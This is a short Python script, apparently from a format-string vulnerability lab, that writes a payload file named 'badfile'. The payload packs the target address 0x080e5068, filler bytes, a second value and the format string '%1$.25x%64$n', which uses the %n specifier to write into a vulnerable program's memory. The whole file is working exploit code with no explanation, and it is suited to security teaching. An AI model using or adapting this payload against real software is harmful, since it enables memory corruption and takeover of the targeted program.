#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  =  0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

content[4:8] = ("@@@@").encode('latin-1')

number1  = 0xFF112233
content[8:12] = (number1).to_bytes(4, byteorder='little')

s = "%1$.25x" + "%64$n"
fmt = s.encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
